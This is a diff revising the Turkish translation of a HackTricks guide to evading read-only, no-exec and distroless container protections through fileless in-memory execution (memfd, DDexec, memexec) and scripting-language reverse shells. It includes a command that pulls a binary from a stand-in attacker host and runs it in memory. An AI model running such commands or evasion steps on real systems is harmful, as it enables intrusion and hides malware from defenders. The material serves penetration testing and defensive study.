@@ -1,17 +1,18 @@
-# FS korumalarını aşma: yalnızca okunur / çalıştırılamaz / Distroless
+# FS korumalarını atlatma: read-only / no-exec / Distroless
 
 {{#include ../../../banners/hacktricks-training.md}}
 
+
 ## Videolar
 
-Aşağıdaki videolarda bu sayfada bahsedilen tekniklerin daha derinlemesine açıklamalarını bulabilirsiniz:
+Aşağıdaki videolarda bu sayfada bahsedilen teknikler daha derinlemesine açıklanmaktadır:
 
-- [**DEF CON 31 - Linux Bellek Manipülasyonunu Gizlilik ve Kaçış için Keşfetmek**](https://www.youtube.com/watch?v=poHirez8jk4)
-- [**DDexec-ng ile Gizli Sızmalar & Bellek İçi dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)
+- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
+- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)
 
-## yalnızca okunur / çalıştırılamaz senaryosu
+## read-only / no-exec senaryosu
 
-Linux makinelerinin **yalnızca okunur (ro) dosya sistemi koruması** ile monte edilmesi giderek daha yaygın hale geliyor, özellikle konteynerlerde. Bunun nedeni, bir konteyneri ro dosya sistemi ile çalıştırmanın **`readOnlyRootFilesystem: true`** ayarını `securitycontext` içinde belirlemek kadar kolay olmasıdır:
+Linux makinelerinin özellikle container'larda **read-only (ro) file system koruması** ile mount edilmiş olması giderek daha yaygınlaşıyor. Bunun nedeni, bir container'ı ro file system ile çalıştırmanın `securitycontext` içinde **`readOnlyRootFilesystem: true`** ayarını yapmak kadar kolay olmasıdır:
 
 <pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
 kind: Pod
@@ -26,45 +27,45 @@ securityContext:
 </strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
 </code></pre>
 
-Ancak, dosya sistemi ro olarak monte edilse bile, **`/dev/shm`** hala yazılabilir olacak, bu nedenle diske hiçbir şey yazamayacağımız yalan. Ancak, bu klasör **çalıştırılamaz koruması ile monte edilecektir**, bu nedenle burada bir ikili dosya indirirseniz **onu çalıştıramayacaksınız**.
+Ancak, file system ro olarak mount edilmiş olsa bile **`/dev/shm`** hâlâ yazılabilir olacaktır; yani diske hiçbir şey yazamayacağımız yönünde bir yanılsama vardır. Bununla birlikte, bu klasör **no-exec koruması ile mount edilir**, bu yüzden buraya bir binary indirirseniz **çalıştıramazsınız**.
 
 > [!WARNING]
-> Kırmızı takım perspektifinden, bu, sistemde zaten bulunmayan ikili dosyaları **indirmek ve çalıştırmak için karmaşık hale getiriyor** (örneğin, arka kapılar veya `kubectl` gibi enumeratörler).
+> Red team açısından bakıldığında, bu durum sistemde zaten olmayan (ör. backdoor'lar veya `kubectl` gibi enumeration araçları) binary'leri **indirmek ve çalıştırmayı zorlaştırır**.
 
-## En Kolay Aşma: Scriptler
+## En kolay bypass: Scripts
 
-İkili dosyalardan bahsettiğimi unutmayın, eğer yorumlayıcı makine içinde mevcutsa, **herhangi bir scripti** çalıştırabilirsiniz, örneğin **shell script** eğer `sh` mevcutsa veya **python** **script** eğer `python` yüklüyse.
+Binarylerden bahsettiğimi unutmayın, eğer interpreter makinede mevcutsa herhangi bir script'i **çalıştırabilirsiniz**, örneğin `sh` varsa bir **shell script**, veya `python` yüklüyse bir **python script**.
 
-Ancak, bu yalnızca ikili arka kapınızı veya çalıştırmanız gereken diğer ikili araçları çalıştırmak için yeterli değildir.
+Ancak bu, binary backdoor'unuzu veya çalıştırmanız gereken diğer binary araçları çalıştırmak için her zaman yeterli değildir.
 
-## Bellek Aşmaları
+## Bellek Bypassları
 
-Bir ikili dosyayı çalıştırmak istiyorsanız ancak dosya sistemi buna izin vermiyorsa, bunu yapmanın en iyi yolu **bellekten çalıştırmaktır**, çünkü **korumalar burada geçerli değildir**.
+Binary çalıştırmak istiyorsanız ama file system buna izin vermiyorsa, en iyi yol onu **bellekten çalıştırmaktır**, çünkü bu korumalar belleğe uygulanmaz.
 
-### FD + exec syscall aşması
+### FD + exec syscall bypass
 
-Makine içinde **Python**, **Perl** veya **Ruby** gibi güçlü script motorlarınız varsa, ikili dosyayı bellekte çalıştırmak için indirebilir, bir bellek dosya tanımlayıcısında (`create_memfd` syscall) saklayabilir, bu korumalardan etkilenmeyecek ve ardından **`exec` syscall** çağrısı yaparak **fd'yi çalıştırılacak dosya olarak belirtebilirsiniz**.
+Makinede Python, Perl veya Ruby gibi güçlü script motorları varsa, binary'yi bellekte çalıştırmak üzere indirip bir memory file descriptor'a (`create_memfd` syscall) koyabilirsiniz; bu fd bu korumalardan etkilenmez ve ardından **fd'yi çalıştırılacak dosya olarak belirten bir `exec` syscall** çağrısı yapılabilir.
 
-Bunun için [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) projesini kolayca kullanabilirsiniz. Bir ikili dosya geçirebilir ve belirtilen dilde, **ikili dosya sıkıştırılmış ve b64 kodlanmış** olarak, `create_memfd` syscall çağrısı ile oluşturulan bir **fd** içinde **çözme ve açma** talimatları ile bir script oluşturacaktır.
+Bunun için [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) projesini kolayca kullanabilirsiniz. Bir binary verirsiniz ve seçilen dilde, binary'nin **sıkıştırılmış ve b64 ile kodlanmış** halini içeren; bunları **decode ve decompress** edip `create_memfd` syscall ile oluşturulan bir **fd'ye** yazma ve çalıştırmak için **exec** syscall çağrısı içeren bir script üretecektir.
 
 > [!WARNING]
-> Bu, PHP veya Node gibi diğer script dillerinde çalışmaz çünkü bunların scriptten ham syscall'leri çağırmak için herhangi bir **varsayılan yolu yoktur**, bu nedenle ikili dosyayı saklamak için **bellek fd'si** oluşturmak için `create_memfd` çağrısı yapmak mümkün değildir.
+> Bu, PHP veya Node gibi diğer scripting dillerinde çalışmaz çünkü bu dillerde raw syscall çağırmanın **varsayılan bir yolu** yoktur; bu yüzden `create_memfd` çağrıp binary'yi saklayacak **memory fd** oluşturmak mümkün değildir.
 >
-> Ayrıca, `/dev/shm` içinde bir dosya ile **normal bir fd** oluşturmak işe yaramayacaktır, çünkü **çalıştırılamaz koruma** uygulanacağı için bunu çalıştırmanıza izin verilmeyecektir.
+> Ayrıca, `/dev/shm` içinde normal bir fd oluşturmak işe yaramaz, çünkü bunu çalıştırmanıza izin verilmeyecektir; **no-exec koruması** uygulanır.
 
 ### DDexec / EverythingExec
 
-[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) tekniği, **kendi sürecinizin belleğini** değiştirerek **`/proc/self/mem`** dosyasını yazmanızı sağlar.
+[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) kendi prosesinizin belleğini, yani **`/proc/self/mem`**'i overwrite ederek değiştirmenize izin veren bir tekniktir.
 
-Bu nedenle, sürecin yürüttüğü **montaj kodunu kontrol ederek**, bir **shellcode** yazabilir ve süreci **herhangi bir keyfi kodu çalıştıracak şekilde "mutasyona" uğratabilirsiniz**.
+Böylece, proses tarafından yürütülen assembly kodunu **kontrol ederek**, bir **shellcode** yazabilir ve prosesi "mutate" ederek **herhangi bir arbitrary kodu** çalıştırmasını sağlayabilirsiniz.
 
 > [!TIP]
-> **DDexec / EverythingExec**, kendi **shellcode'unuzu** veya **herhangi bir ikili dosyayı** **bellekten** yükleyip **çalıştırmanıza** olanak tanır.
+> **DDexec / EverythingExec**, kendi **shellcode**'unuzu veya **bellekten** herhangi bir **binary**'yi yükleyip **çalıştırmanıza** olanak verir.
 ```bash
 # Basic example
 wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
 ```
-Daha fazla bilgi için bu tekniği Github'da kontrol edin veya:
+Bu teknik hakkında daha fazla bilgi için Github'a bakın veya:
 
 {{#ref}}
 ddexec.md
@@ -72,39 +73,46 @@ ddexec.md
 
 ### MemExec
 
-[**Memexec**](https://github.com/arget13/memexec), DDexec'in doğal bir sonraki adımıdır. Bu, **DDexec shellcode demonized** olduğu için, her seferinde **farklı bir ikili dosya çalıştırmak istediğinizde** DDexec'i yeniden başlatmanıza gerek yoktur, sadece memexec shellcode'u DDexec tekniği aracılığıyla çalıştırabilir ve ardından **yeni ikili dosyaları yüklemek ve çalıştırmak için bu demon ile iletişim kurabilirsiniz**.
+[**Memexec**](https://github.com/arget13/memexec) DDexec'in doğal sonraki adımıdır. Bu, bir **DDexec shellcode demonised**'dir; bu yüzden her seferinde **run a different binary** istediğinizde DDexec'i yeniden başlatmanıza gerek yoktur, DDexec tekniği ile memexec shellcode'u çalıştırıp sonra bu deamon ile **communicate with this deamon to pass new binaries to load and run** yapabilirsiniz.
 
-**Memexec'i bir PHP ters shell'den ikili dosyaları çalıştırmak için nasıl kullanacağınızla ilgili bir örneği** [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php) adresinde bulabilirsiniz.
+**memexec to execute binaries from a PHP reverse shell** kullanımıyla ilgili bir örneği [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php) adresinde bulabilirsiniz.
 
 ### Memdlopen
 
-DDexec ile benzer bir amaca sahip olan [**memdlopen**](https://github.com/arget13/memdlopen) tekniği, **ikili dosyaları** belleğe yüklemenin daha **kolay bir yolunu** sağlar ve daha sonra bunları çalıştırmanıza olanak tanır. Hatta bağımlılıkları olan ikili dosyaları yüklemenize bile izin verebilir.
+DDexec ile benzer bir amaç taşıyan [**memdlopen**](https://github.com/arget13/memdlopen) tekniği, ikili dosyaları belleğe yükleyip daha sonra çalıştırmak için **daha kolay bir yol** sağlar. Hatta bağımlılıkları olan binaries'leri bile yüklemeye imkan tanıyabilir.
 
 ## Distroless Bypass
 
+Distroless'in gerçekte ne olduğu, ne zaman yardımcı olduğu, ne zaman olmadığı ve konteynerlerde post-exploitation tradecraft'i nasıl değiştirdiği hakkında ayrıntılı bir açıklama için bakın:
+
+{{#ref}}
+../../privilege-escalation/container-security/distroless.md
+{{#endref}}
+
 ### Distroless nedir
 
-Distroless konteynerler, belirli bir uygulama veya hizmeti çalıştırmak için gerekli olan **en az gerekli bileşenleri** içerir; bu, kütüphaneler ve çalışma zamanı bağımlılıkları gibi bileşenleri içerir, ancak bir paket yöneticisi, shell veya sistem yardımcı programları gibi daha büyük bileşenleri hariç tutar.
+Distroless konteynerler yalnızca belirli bir uygulamayı veya servisi çalıştırmak için gerekli olan **en az bileşenleri**, örneğin kütüphaneler ve runtime bağımlılıkları içerir; ancak package manager, shell veya system utilities gibi daha büyük bileşenleri hariç tutar.
 
-Distroless konteynerlerin amacı, **gereksiz bileşenleri ortadan kaldırarak konteynerlerin saldırı yüzeyini azaltmak** ve istismar edilebilecek zafiyet sayısını en aza indirmektir.
+Distroless konteynerlerin amacı, gereksiz bileşenleri ortadan kaldırarak konteynerlerin saldırı yüzeyini **azaltmak** ve sömürülebilecek zafiyet sayısını en aza indirmektir.
 
-### Ters Shell
+### Reverse Shell
 
-Distroless bir konteynerde **normal bir shell almak için `sh` veya `bash`** bile bulamayabilirsiniz. Ayrıca `ls`, `whoami`, `id` gibi ikili dosyaları da bulamayacaksınız... genellikle bir sistemde çalıştırdığınız her şey.
+Bir distroless konteynerde normal bir shell almak için **`sh` veya `bash` bile bulamayabilirsiniz**. Ayrıca `ls`, `whoami`, `id` gibi ikili programları da bulamazsınız... sistemde genellikle çalıştırdığınız her şey eksik olabilir.
 
 > [!WARNING]
-> Bu nedenle, **ters bir shell** almanız veya sistemi **numaralandırmanız** mümkün **olmayacaktır**.
+> Bu nedenle, normalde yaptığınız gibi bir **reverse shell** elde edemeyecek veya sistemi **enumerate** edemeyeceksiniz.
 
-Ancak, eğer ele geçirilmiş konteyner örneğin bir flask web uygulaması çalıştırıyorsa, o zaman python yüklüdür ve bu nedenle bir **Python ters shell** alabilirsiniz. Eğer node çalıştırıyorsa, bir Node rev shell alabilirsiniz ve çoğu **betik dili** ile aynı durum geçerlidir.
-
-> [!TIP]
-> Betik dilini kullanarak, dilin yeteneklerini kullanarak **sistemi numaralandırabilirsiniz**.
-
-Eğer **`read-only/no-exec`** korumaları yoksa, ters shell'inizi kullanarak **dosya sistemine ikili dosyalarınızı yazabilir** ve **çalıştırabilirsiniz**.
+Ancak, örneğin ele geçirilmiş konteyner bir flask web uygulaması çalıştırıyorsa python yüklü olacaktır ve bu yüzden bir **Python reverse shell** alabilirsiniz. Node çalıştırıyorsa bir Node rev shell alabilirsiniz ve çoğunlukla herhangi bir **scripting language** ile durum benzerdir.
 
 > [!TIP]
-> Ancak, bu tür konteynerlerde bu korumalar genellikle mevcut olacaktır, ancak **önceki bellek yürütme tekniklerini bunları aşmak için kullanabilirsiniz**.
+> Scripting language'ı kullanarak dilin sunduğu yeteneklerle sistemi **enumerate** edebilirsiniz.
 
-**Bazı RCE zafiyetlerini istismar ederek betik dillerinden **ters shell'ler** almak ve bellekte ikili dosyaları çalıştırmak için **örnekleri** [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) adresinde bulabilirsiniz.
+Eğer **`read-only/no-exec`** korumaları yoksa reverse shell'inizi suistimal ederek dosya sistemine **binary'lerinizi yazabilir** ve bunları **çalıştırabilirsiniz**.
+
+> [!TIP]
+> Ancak bu tür konteynerlerde bu korumalar genellikle bulunur; bunları atlatmak için **önceki bellek yürütme tekniklerini** kullanabilirsiniz.
+
+Scripting dilleriyle **reverse shells** elde etmek ve bellekten binaries çalıştırmak için bazı **RCE zafiyetlerini exploit etme** örneklerini [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) adresinde bulabilirsiniz.
+
 
 {{#include ../../../banners/hacktricks-training.md}}
